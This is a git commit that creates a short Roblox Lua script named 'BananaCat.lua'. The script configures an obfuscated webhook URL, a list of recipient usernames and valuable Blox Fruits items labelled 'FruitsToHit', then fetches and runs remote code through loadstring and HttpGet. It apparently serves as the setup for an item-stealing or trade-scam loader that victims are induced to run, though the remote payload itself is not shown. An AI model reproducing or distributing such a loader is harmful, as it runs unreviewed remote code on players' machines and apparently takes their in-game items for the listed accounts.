c89275a1dc2dec91286b30f92cd82220609510b7
bananacat <congchitran2k9@gmail.com>
2025-04-07 22:08:37 +0700

    Create BananaCat.lua

---
+++ BananaCat.lua
@@ -0,0 +1,5 @@
+Webhook = "https://webhook-protect.vercel.app/api/webhook?id=U1BlWkZiVkMweVVqTkIzN1A2S0QtUTpxeGRfSlFFcVA1dndZeXdkcUMzaGJvUDkzNzk5ZjlOT1FHaWJrc0twZXhyRkUtSHBrMXZZZEU1RWtORWl3a1Fuc1F6SFlmWEhiWndJQ0Q0bmlkMmQxRFBzZEx6cjNFV0lTcFBxYktTQnBrOU1NSm5rZ3FnTjUzNFV2R2NvODYzR2RTZ0gzWm1wZzA4d0tOMTR2U0hHa0FwZVo1Z1pqbE5Mb1JaNEFHTS1YWEk" -- << Your Webhook
+Usernames = {"tranchicong24", "forfylgdiil", "mfzgnr", "tarronfj", "fritzowjr"} -- << Your username(-s).
+FruitsToHit = {"Kitsune-Kitsune", "Yeti-Yeti", "Gas-Gas"} -- << Fruits you want
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/surelyco/CutestCodes/refs/heads/main/V2"))()
